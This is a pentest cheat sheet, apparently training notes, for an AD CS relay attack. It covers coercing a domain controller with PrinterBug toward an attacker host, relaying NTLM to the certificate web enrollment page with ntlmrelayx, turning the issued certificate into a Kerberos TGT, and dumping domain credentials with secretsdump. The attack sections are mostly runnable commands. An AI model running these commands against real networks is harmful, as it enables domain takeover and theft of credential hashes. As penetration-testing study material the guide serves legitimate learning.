
## 1. Listen for Inbound Connections (NTLM authentication packets)

- Listening for NTLM authentication packets in the SMB server. If those hashes are found we can relay them to the `web enrollment` site and perform **Pass the Ticket** attack.

```bash
impacket-ntlmrelayx -t http://<TARGET_IP>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

## 2. Force Victim Machine to Connect to Attacker Machine (Coercion)

- Attackers can either wait for the victim machine to attempt authentication or they can force the victim machines to attempt authentication by exploiting the **printer bug**. This requires the victim machine to have `Printer Spooler` service running.

- **HOW THE PRINTER SPOOFER ATTACK WORKS** :
	1. **Request** : The coercion tool forces the DC to communicate with the attacker machine. It says it wants to authenticate itself using NTLM.
	2. **Trick** : The attacker machine then communicates with the `Web Enrollment` site and tells that the attacker wants to authenticate itself so the site generates a random challenge to verify the attacker's authenticity. If its able to encrypt the challenge using the correct hashing algorithm then it authenticates itself as that particular user.
	3. **Relay** : The attacker takes the random challenge and sends to the DC, which uses its own NTLM to encrypt it and then the attacker takes the response and sends the response back to the `Web Enrollment Site` and authenticates as the DC. We use this attack path to get the **Certificate** which we use again to get the **Kerberos Ticket (TGT)***.


```bash
python3 printerbug.py <DOMAIN_NAME>/<DOMAIN_USER/CONTROLLER>:"<DOMAIN_USER/CONTROLLER_PASSWORD>"@<DOMAIN_IP> <ATTACKER_IP>
```

- If the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for that domain user or domain controller, then we can perform our **Pass the Certificate** attack to obtain the **TGT** as that domain user or domain controller. 
- You will obtain the `CERTIFICATE` here if authentication works successfully.

## 3. Obtain Kerberos Ticket

- Using the issued Certificate we can obtain the Kerberos ticket for that domain user or domain controller.
- `CERTIFICATE_FILEPATH` : mention the path of the certificate you got during listening for NTLM authentications.
- `KERBEROS_TICKET_FILENAME` : is the filename and path where you want to save the **Kerberos ticket** locally in your attack machine locally.

```bash
python3 gettgtpkinit.py -cert-pfx <CERTIFICATE_FILEPATH> -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN_NAME>' <KERBEROS_TICKET_FILENAME>
```

## 4. Pass the Ticket (PtT)

- `FQDN` = Fully Qualified Domain Name. For example :- An approximate structure is shown below. 

```
   [ Hostname ]  .  [ Parent Domain ]  .  [ Top-Level Domain ]
       DC01      .     INLANEFREIGHT   .         LOCAL
```

- `export` or load you current **Kerberos Ticket** in the current shell environment variable `KRB5CCNAME` and then authenticate yourself.

```bash
export KRB5CCNAME=<KERBEROS_TICKET_FILENAME>
impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user <TARGET_USER> '<DOMAIN_NAME>/<IDENTITY_ACCOUNT_NAME>'@<TARGET_SERVER_FQDN>
```



